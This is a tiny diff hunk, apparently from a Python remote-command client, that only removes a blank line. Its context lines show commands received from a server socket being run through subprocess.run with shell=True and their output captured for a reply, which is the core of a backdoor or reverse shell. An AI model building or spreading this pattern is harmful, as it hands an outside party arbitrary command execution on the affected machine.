@@ -67,7 +67,6 @@ def handle_server_communication(s):
                 except Exception as e:
                     print(f"Произошла ошибка: {e}")
 
-
             else:
                 command = subprocess.run(data, shell=True, capture_output=True, text=True)
                 response = command.stdout if command.stdout else command.stderr
